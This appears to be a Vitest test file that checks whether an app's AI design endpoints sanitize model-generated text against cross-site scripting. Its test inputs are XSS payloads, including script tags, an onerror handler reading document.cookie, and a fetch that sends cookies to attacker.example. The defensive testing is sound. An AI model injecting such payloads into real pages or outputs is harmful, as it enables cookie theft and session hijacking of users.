/**
 * Tests that AI response text is sanitized before being returned to clients.
 *
 * Security goal: model output echoed back from a user-supplied prompt cannot
 * reach the browser DOM as executable markup. Every human-readable text field
 * in a design AI response is passed through sanitizeAiResponse before the
 * server sends it. Specifically:
 *
 *   /api/ai/design (routes.ts inline handler):
 *     - type:"message" → text
 *     - type:"patch"   → message
 *     - type:"state"   → message, title
 *
 *   /api/ai/design (designHandlers.ts — the extracted, testable handler):
 *     - same text/message fields; no title field in this handler
 *
 *   /api/ai/design-from-image, /api/ai/design-from-url,
 *   /api/ai/design-edit-from-image (routes.ts inline handlers):
 *     - type:"message" → text
 *     - type:"patch"   → message
 *     - type:"state"   → message
 *
 *   /api/ai/interface-proposal:
 *     - per-screen description
 *
 *   /api/ai/interface-proposal-refine:
 *     - aiMessage (top-level chat summary)
 *     - per-change name, description, designNotes
 *
 * craft state (JSON) is never rendered as HTML so it is exempt. The general
 * /api/ai/chat proxy is also exempt because its payload may itself be JSON
 * and sanitizing it would corrupt structured responses — the frontend renders
 * that text via ReactMarkdown which does not execute raw HTML by default
 * (no rehype-raw plugin is configured).
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import express from 'express';
import request from 'supertest';
import { sanitizeAiResponse } from '../server/utils/sanitize';

// ── Unit tests for sanitizeAiResponse ────────────────────────────────────────

describe('sanitizeAiResponse', () => {
  it('strips a bare <script> tag', () => {
    const input = 'Hello <script>alert(1)</script> world';
    const output = sanitizeAiResponse(input);
    expect(output).not.toContain('<script>');
    expect(output).not.toContain('alert(1)');
    expect(output).toContain('Hello');
    expect(output).toContain('world');
  });

  it('strips a script tag with attributes', () => {
    const input = '<script src="https://evil.example/x.js"></script>Nice design!';
    const output = sanitizeAiResponse(input);
    expect(output).not.toContain('<script');
    expect(output).not.toContain('evil.example');
    expect(output).toContain('Nice design!');
  });

  it('strips an onerror event attribute', () => {
    const input = '<img src=x onerror="alert(document.cookie)">Look at this';
    const output = sanitizeAiResponse(input);
    expect(output).not.toContain('onerror');
    expect(output).not.toContain('document.cookie');
  });

  it('strips javascript: href', () => {
    const input = '<a href="javascript:alert(1)">click me</a>';
    const output = sanitizeAiResponse(input);
    expect(output).not.toContain('javascript:');
  });

  it('preserves safe inline formatting', () => {
    const input = 'Use <strong>bold</strong> and <em>italic</em> text here.';
    const output = sanitizeAiResponse(input);
    expect(output).toContain('<strong>bold</strong>');
    expect(output).toContain('<em>italic</em>');
  });

  it('handles null and undefined safely', () => {
    expect(sanitizeAiResponse(null)).toBe('');
    expect(sanitizeAiResponse(undefined)).toBe('');
  });

  it('handles empty string', () => {
    expect(sanitizeAiResponse('')).toBe('');
  });

  it('does not corrupt plain text', () => {
    const input = 'Added a login button and a sign-up form to the landing page.';
    expect(sanitizeAiResponse(input)).toBe(input);
  });

  // ── title field sanitization (applied in the routes.ts inline /api/ai/design handler) ──
  it('strips a script tag from a design title string', () => {
    const raw = '<script>alert(1)</script>My App';
    const sanitized = sanitizeAiResponse(raw.trim()).slice(0, 80) || undefined;
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert(1)');
    expect(sanitized).toContain('My App');
  });

  it('does not corrupt a benign design title', () => {
    const raw = 'My App Design';
    const sanitized = sanitizeAiResponse(raw.trim()).slice(0, 80) || undefined;
    expect(sanitized).toBe('My App Design');
  });

  // ── interface-proposal description sanitization ────────────────────────────
  it('strips a script tag from a proposal screen description', () => {
    const raw = 'Users log in here. <script>fetch("//evil.example")</script>';
    const sanitized = sanitizeAiResponse(raw);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('evil.example');
    expect(sanitized).toContain('Users log in here.');
  });

  // ── interface-proposal-refine field sanitization ───────────────────────────
  it('strips a script tag from an aiMessage companion string', () => {
    const raw = 'Done! <script>alert(document.cookie)</script>';
    const sanitized = sanitizeAiResponse(raw);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.cookie');
    expect(sanitized).toContain('Done!');
  });

  it('strips a script tag from a change-action name field', () => {
    const raw = '<script>alert(1)</script>Login Screen';
    const sanitized = sanitizeAiResponse(raw).slice(0, 200);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('Login Screen');
  });
});

// ── Integration tests for the design generation handler ──────────────────────

// Mock executeAiChat so we can control the simulated AI output.
vi.mock('../server/aiChatExecutor', () => ({
  executeAiChat: vi.fn(),
}));

import { executeAiChat } from '../server/aiChatExecutor';
import { designGenerationHandler } from '../server/designHandlers';

function buildApp() {
  const app = express();
  app.use(express.json());
  app.post('/api/ai/design', designGenerationHandler);
  return app;
}

describe('designGenerationHandler — AI response sanitization', () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it('strips a <script> tag injected into a type:message text before returning it', async () => {
    const maliciousText =
      'Here is your design! <script>fetch("https://attacker.example/steal?c="+document.cookie)</script>';

    (executeAiChat as any).mockResolvedValue({
      ok: true,
      status: 200,
      // The AI prefill is '{', so the handler prepends '{' before parsing.
      text: `"type":"message","text":${JSON.stringify(maliciousText)}}`,
      json: {},
    });

    const app = buildApp();
    const res = await request(app)
      .post('/api/ai/design')
      .send({ prompt: 'Add a login button' });

    expect(res.status).toBe(200);
    expect(res.body.type).toBe('message');
    // The text field must not carry the script tag.
    expect(res.body.text).not.toContain('<script>');
    expect(res.body.text).not.toContain('attacker.example');
    // Harmless prose should survive.
    expect(res.body.text).toContain('Here is your design!');
  });

  it('strips a <script> tag in a patch.message companion field', async () => {
    const maliciousMessage = '<script>alert("xss")</script>Applied your patch.';

    (executeAiChat as any).mockResolvedValue({
      ok: true,
      status: 200,
      text: `"type":"patch","nodes":{"ROOT":{"type":"div","isCanvas":true,"props":{},"displayName":"div","custom":{},"hidden":false,"nodes":[],"linkedNodes":{}}},"message":${JSON.stringify(maliciousMessage)}}`,
      json: {},
    });

    const app = buildApp();
    const res = await request(app)
      .post('/api/ai/design')
      .send({ prompt: 'Change the button color' });

    expect(res.status).toBe(200);
    expect(['patch', 'state']).toContain(res.body.type);
    // message is always present when the AI provides one (sanitizer keeps harmless text)
    const message: string = res.body.message ?? '';
    expect(message).not.toContain('<script>');
    expect(message).not.toContain('alert("xss")');
    // The safe trailing text must survive sanitization.
    // (sanitize-html discards the script element; remaining text may or may not
    // have leading whitespace depending on library version — just check absence of markup)
    expect(message).not.toMatch(/<script/i);
  });

  it('does not corrupt a benign patch.message', async () => {
    const safeMessage = 'I updated the button colour to blue.';

    (executeAiChat as any).mockResolvedValue({
      ok: true,
      status: 200,
      text: `"type":"patch","nodes":{"ROOT":{"type":"div","isCanvas":true,"props":{},"displayName":"div","custom":{},"hidden":false,"nodes":[],"linkedNodes":{}}},"message":${JSON.stringify(safeMessage)}}`,
      json: {},
    });

    const app = buildApp();
    const res = await request(app)
      .post('/api/ai/design')
      .send({ prompt: 'Change the button colour to blue' });

    expect(res.status).toBe(200);
    // Message survives unchanged when it contains no markup.
    expect(res.body.message).toBe(safeMessage);
  });

  it('strips a <script> tag in a state.message companion field', async () => {
    const maliciousMessage = 'Updated! <script>document.location="//evil.example"</script>';

    (executeAiChat as any).mockResolvedValue({
      ok: true,
      status: 200,
      text: `"type":"state","message":${JSON.stringify(maliciousMessage)},"craftState":{"ROOT":{"type":"div","isCanvas":true,"props":{},"displayName":"div","custom":{},"hidden":false,"nodes":[],"linkedNodes":{}}}}`,
      json: {},
    });

    const app = buildApp();
    const res = await request(app)
      .post('/api/ai/design')
      .send({ prompt: 'Redesign the homepage' });

    expect(res.status).toBe(200);
    expect(res.body.type).toBe('state');
    const message: string = res.body.message ?? '';
    expect(message).not.toMatch(/<script/i);
    expect(message).not.toContain('evil.example');
    expect(message).toContain('Updated!');
  });
});
